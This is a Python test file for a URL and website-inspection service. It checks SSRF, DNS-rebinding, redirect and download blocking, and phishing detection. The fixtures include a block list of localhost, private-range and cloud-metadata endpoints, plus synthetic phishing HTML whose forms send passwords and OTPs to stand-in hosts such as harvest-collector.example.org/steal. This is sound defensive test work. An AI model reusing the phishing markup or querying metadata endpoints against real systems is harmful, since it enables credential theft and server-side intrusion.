"""Tests for Isolated Website Inspection, SSRF/DNS-rebinding blocks, and Page Trackers/Phishing."""

import httpx

from app.core.config import WebsiteInspectionConfig
from app.services.risk_scorer import score_indicators
from app.services.url_analyzer import analyze_url_full
from app.services.message_analyzer import analyze_message_urls
from app.services.website_inspector import (
    InspectionOutcome,
    inspect_website_safely,
    parse_html_observations,
)


def _mock_client_factory(responses_by_url: dict[str, httpx.Response]):
    """Create a mock httpx.Client factory that records methods and serves synthetic fixtures."""
    methods_called: list[str] = []

    class _MockClient:
        def __init__(self, **kwargs):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *args):
            return False

        def get(self, url: str) -> httpx.Response:
            methods_called.append("GET")
            resp = responses_by_url.get(url)
            if resp is None:
                raise httpx.ConnectError("No fixture for URL")
            return resp

    return _MockClient, methods_called


def test_private_ip_localhost_and_cloud_metadata_blocked() -> None:
    """Private IPs, localhost, and cloud metadata endpoints must be blocked before connecting."""
    blocked_targets = [
        "http://127.0.0.1/admin",
        "http://localhost/login",
        "http://192.168.1.10/router",
        "http://10.0.0.5/internal",
        "http://172.16.0.1/panel",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
    ]
    for target in blocked_targets:
        outcome = inspect_website_safely(
            target,
            dns_resolver=lambda _h: ["127.0.0.1"],
        )
        assert outcome.status == "blocked", f"Expected blocked for {target}, got {outcome.status}"
        assert "blocked" in (outcome.reason or "").lower()


def test_dns_rebinding_to_private_ip_blocked() -> None:
    """DNS resolution returning a private or metadata IP must be blocked."""
    outcome = inspect_website_safely(
        "https://rebind-test.example.com/",
        dns_resolver=lambda _h: ["93.184.216.34", "169.254.169.254"],
    )
    assert outcome.status == "blocked"
    assert "169.254.169.254" in (outcome.reason or "")


def test_redirect_to_localhost_blocked() -> None:
    """Redirecting from a public URL to localhost must be blocked before following."""
    mock_cls, _ = _mock_client_factory(
        {
            "https://public.example.com/start": httpx.Response(
                302,
                headers={"location": "http://127.0.0.1/secret"},
            )
        }
    )
    outcome = inspect_website_safely(
        "https://public.example.com/start",
        dns_resolver=lambda _h: ["93.184.216.34"],
        http_client_factory=mock_cls,
    )
    assert outcome.status == "blocked"
    assert "http://127.0.0.1/secret" in outcome.blocked_destinations


def test_download_attachment_and_binary_mime_blocked() -> None:
    """File downloads (Content-Disposition attachment or binary MIME) must be blocked."""
    mock_attach, _ = _mock_client_factory(
        {
            "https://files.example.com/get": httpx.Response(
                200,
                headers={"content-disposition": "attachment; filename=setup.exe"},
                content=b"MZ...",
            )
        }
    )
    outcome1 = inspect_website_safely(
        "https://files.example.com/get",
        dns_resolver=lambda _h: ["93.184.216.34"],
        http_client_factory=mock_attach,
    )
    assert outcome1.status == "blocked"

    mock_bin, _ = _mock_client_factory(
        {
            "https://files.example.com/bin": httpx.Response(
                200,
                headers={"content-type": "application/x-msdownload"},
                content=b"MZ...",
            )
        }
    )
    outcome2 = inspect_website_safely(
        "https://files.example.com/bin",
        dns_resolver=lambda _h: ["93.184.216.34"],
        http_client_factory=mock_bin,
    )
    assert outcome2.status == "blocked"


def test_inspection_timeout_returns_unavailable_never_safe() -> None:
    """Timeout during inspection must report Inspection unavailable, never Safe."""
    class _TimeoutClient:
        def __init__(self, **kwargs):
            pass

        def __enter__(self):
            return self

        def __exit__(self, *args):
            return False

        def get(self, _url: str):
            raise httpx.ReadTimeout("timed out")

    _, findings, domain_summary, outcome = analyze_url_full(
        "https://slow.example.com/about",
        inspect_website=True,
        inspector_fn=lambda u: inspect_website_safely(
            u,
            dns_resolver=lambda _h: ["93.184.216.34"],
            http_client_factory=_TimeoutClient,
        ),
    )
    assert outcome.status == "unavailable"
    assessment = score_indicators(
        findings,
        domain_intelligence=domain_summary,
        inspection_outcome=outcome,
    )
    assert assessment.risk_level == "Inspection unavailable"


def test_fake_phishing_site_with_brand_form_and_external_action_is_dangerous() -> None:
    """Synthetic phishing fixture with brand impersonation + password/OTP + external form = Dangerous."""
    phish_html = """
    <html>
      <head><title>PayPal Security Verification</title></head>
      <body>
        <h1>Verify your PayPal account</h1>
        <form action="https://harvest-collector.example.org/steal" method="POST">
          <input type="email" name="email" />
          <input type="password" name="password" />
          <input type="text" name="otp" placeholder="Enter OTP" />
        </form>
        <script src="http://198.51.100.10/loader.js"></script>
      </body>
    </html>
    """
    obs = parse_html_observations(
        html_text=phish_html,
        final_url="https://portal-update-center.com/auth",
        status_code=200,
        redirect_chain=[],
        set_cookie_headers=[],
    )
    _, findings, domain_summary, outcome = analyze_url_full(
        "https://portal-update-center.com/auth",
        inspect_website=True,
        inspector_fn=lambda _u: InspectionOutcome(status="completed", observation=obs),
    )
    assessment = score_indicators(
        findings,
        domain_intelligence=domain_summary,
        inspection_outcome=outcome,
    )
    assert assessment.risk_score >= 50
    assert assessment.risk_level == "Dangerous"
    rule_ids = {r.rule_id for r in assessment.detected_rules}
    assert "page_brand_impersonation" in rule_ids
    assert "suspicious_form_destination" in rule_ids
    assert "strong_credential_harvesting" in rule_ids
    assert "suspicious_third_party_script" in rule_ids


def test_legitimate_site_with_trackers_has_no_strong_indicators_and_zero_risk() -> None:
    """Legitimate site with GA, GTM, Meta Pixel, tracking pixels, and cookies stays 0 / No strong indicators."""
    legit_html = """
    <html>
      <head>
        <title>Example Store - Home</title>
        <script src="https://www.googletagmanager.com/gtm.js?id=GTM-123"></script>
        <script src="https://connect.facebook.net/en_US/fbevents.js"></script>
      </head>
      <body>
        <p>Welcome to Example Store.</p>
        <img src="https://www.facebook.com/tr?id=999&ev=PageView" />
      </body>
    </html>
    """
    mock_cls, methods_called = _mock_client_factory(
        {
            "https://example-store.com/": httpx.Response(
                200,
                headers=[
                    ("content-type", "text/html; charset=utf-8"),
                    ("set-cookie", "_ga=GA1.2.12345; Path=/"),
                    ("set-cookie", "_fbp=fb.1.98765; Path=/"),
                ],
                text=legit_html,
            )
        }
    )

    _, findings, domain_summary, outcome = analyze_url_full(
        "https://example-store.com/",
        inspect_website=True,
        inspector_fn=lambda u: inspect_website_safely(
            u,
            dns_resolver=lambda _h: ["93.184.216.34"],
            http_client_factory=mock_cls,
        ),
    )
    # Form submission prevention: only GET is ever used
    assert methods_called == ["GET"]
    assert outcome.status == "completed"

    assessment = score_indicators(
        findings,
        domain_intelligence=domain_summary,
        inspection_outcome=outcome,
    )
    assert assessment.risk_score == 0
    assert assessment.risk_level == "No strong indicators detected"
    sources = {t.detection_source for t in assessment.tracker_indicators}
    assert {"html_script", "tracking_pixel", "cookie"}.issubset(sources)


def test_url_and_message_scanner_consistent_with_inspection() -> None:
    """URL Scanner and Message Scanner must produce identical scores when inspect_website=True."""
    obs = parse_html_observations(
        html_text="<title>Microsoft Sign In</title><form action='https://evil.org/post'><input type='password'></form>",
        final_url="https://unrelated-host.com/login",
        status_code=200,
        redirect_chain=[],
        set_cookie_headers=[],
    )
    mock_outcome = InspectionOutcome(status="completed", observation=obs)

    _, url_findings, url_dom, url_out = analyze_url_full(
        "https://unrelated-host.com/login",
        inspect_website=True,
        inspector_fn=lambda _u: mock_outcome,
    )
    url_assessment = score_indicators(
        url_findings, domain_intelligence=url_dom, inspection_outcome=url_out
    )

    msg_assessment = analyze_message_urls(
        "Please check https://unrelated-host.com/login",
        inspect_website=True,
        inspector_fn=lambda _u: mock_outcome,
    )
    assert msg_assessment.overall_risk_score == url_assessment.risk_score
    assert msg_assessment.overall_risk_level == url_assessment.risk_level


def test_inspection_disabled_reports_unavailable() -> None:
    """When WEBSITE_INSPECTION_ENABLED=false, inspect_website_safely returns unavailable."""
    outcome = inspect_website_safely(
        "https://example.com/",
        config=WebsiteInspectionConfig(enabled=False),
    )
    assert outcome.status == "unavailable"
